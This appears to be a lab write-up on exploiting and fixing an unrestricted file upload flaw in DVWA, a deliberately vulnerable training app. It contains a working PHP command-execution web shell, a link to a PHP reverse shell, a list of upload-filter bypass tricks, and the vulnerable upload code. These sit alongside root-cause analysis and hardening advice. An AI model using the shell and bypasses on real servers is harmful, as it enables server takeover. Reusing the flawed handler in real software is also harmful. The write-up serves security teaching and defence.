>**Vulnerability ID:** VULN-DVWA-2024-FILE-UPLOAD  
   **Risk Level:** Critical  
   **CVSS Score:** 9.3 (Critical)

### 1. Business Impact Analysis

- **Remote Code Execution:** Attackers can upload web shells to gain complete server control        
- **Malware Distribution:** Server can be used to host and distribute malicious software
- **Compliance Violations:** Breach of data protection regulations and security standards

### 2. Vulnerability Identification Methods

**Code Analysis Patterns:**
- Search for file upload handlers without proper validation checks
- Identify missing file type verification (MIME type, file extension, content)
- Check for absence of file size restrictions and name sanitization
- Look for insecure file storage locations with execution permissions

**Vulnerability Location Identified:**  
The application contains an unrestricted file upload vulnerability allowing malicious file uploads:

```powershell
http://192.168.1.4/DVWA/vulnerabilities/upload/
```
![[Pasted image 20251106234553.png]]
### 3. Exploitation Analysis

**Attack Vector:** Malicious File Upload  
The application accepts file uploads without proper validation, enabling attackers to upload executable web shells.

**Web Shell Creation:**

```php
<?php
// Simple PHP web shell
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
```
**reverse Shell :** https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php

**Bypass Techniques:**

- File extension manipulation (.php, .phtml, .php5, .phar)
- Double extensions (shell.php.jpg)
- MIME type spoofing (image/jpeg for PHP file)
- Magic byte injection (GIF89a headers)
- Null byte injection (shell.php%00.jpg)

**Successful Exploitation:**  
The malicious PHP web shell was successfully uploaded and accessible at:

```powershell
http://192.168.1.4/DVWA/hackable/uploads/shell.php
```
![[Pasted image 20251106230659.png]]

then run it by open this link `http://192.168.1.4/DVWA/vulnerabilities/192.168.1.4/DVWA/hackable/uploads/rev_shell.php`
![[Pasted image 20251106231102.png]]
### 4. Vulnerability Root Cause

**Vulnerable Code:**
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
        // Where are we going to be writing to?
        $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
        $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
                // No
                $html .= '<pre>Your image was not uploaded.</pre>';
        }
        else {
                // Yes!
                $html .= "<pre>{$target_path} succesfully uploaded!</pre>";
        }
}
?>
```

**Primary Issues:**

1. **No File Type Validation:** Absence of file extension and MIME type checking
2. **Missing Content Verification:** No magic byte or file content validation
3. **Unrestricted Upload Directory:** Files stored in web-accessible location with execution permissions
4. **No File Name Sanitization:** Original file names preserved, enabling double extensions
5. **Lack of Size Restrictions:** No limits on uploaded file size

### 5. Mitigation Strategies

**Server Configuration Hardening:**

```apache 
# .htaccess protection for upload directory
<FilesMatch "\.(php|php5|phtml|phar)$">
    Deny from all
</FilesMatch>

# Prevent execution in upload directory
<Directory "/var/www/html/uploads">
    php_flag engine off
    RemoveHandler .php .php5 .phtml
    RemoveType .php .php5 .phtml
</Directory>
```
**Defense-in-Depth Measures:**

1. **Input Validation:**
    - Whitelist allowed file extensions and MIME types
    - Validate file content using magic bytes
    - Implement file size restrictions
2. **File Handling:**
    - Generate random file names to prevent direct access
    - Store files outside web root when possible
    - Remove execution permissions from uploaded files
3. **Server Security:**
    - Configure web server to prevent execution in upload directories
    - Implement virus scanning for uploaded files
    - Use Web Application Firewall (WAF) rules
4. **Monitoring:**
    - Log all file upload attempts
    - Monitor upload directory for suspicious files
    - Implement file integrity checking

### 6. Risk Assessment Matrix

|Impact Area|Severity|Likelihood|Overall Risk|
|---|---|---|---|
|Data Confidentiality|Critical|High|Critical|
|System Integrity|Critical|High|Critical|
|Service Availability|High|High|Critical|
|Compliance|Critical|High|Critical|

### 7. Testing Verification

**Remediation Validation Steps:**

1. Attempt to upload PHP web shell - should be rejected
2. Test double extension bypass (shell.php.jpg) - should be blocked
3. Verify MIME type spoofing detection
4. Test file size limit enforcement
5. Confirm safe file (image, PDF) uploads still function
6. Verify uploaded files cannot be executed

**Post-Mitigation Testing Results:**

- PHP files and other executables are blocked
- Only whitelisted file types are accepted
- File names are sanitized and randomized
- Upload directory prevents script execution

### Appendix A: Reference Materials

- **OWASP Unrestricted File Upload:** [https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- **CWE-434: Unrestricted Upload of File with Dangerous Type** - [https://cwe.mitre.org/data/definitions/434.html](https://cwe.mitre.org/data/definitions/434.html)
- **SANS Secure File Upload Guide:** [https://www.sans.org/blog/secure-file-upload/](https://www.sans.org/blog/secure-file-upload/)
- **MITRE ATT&CK:** T1105 - Ingress Tool Transfer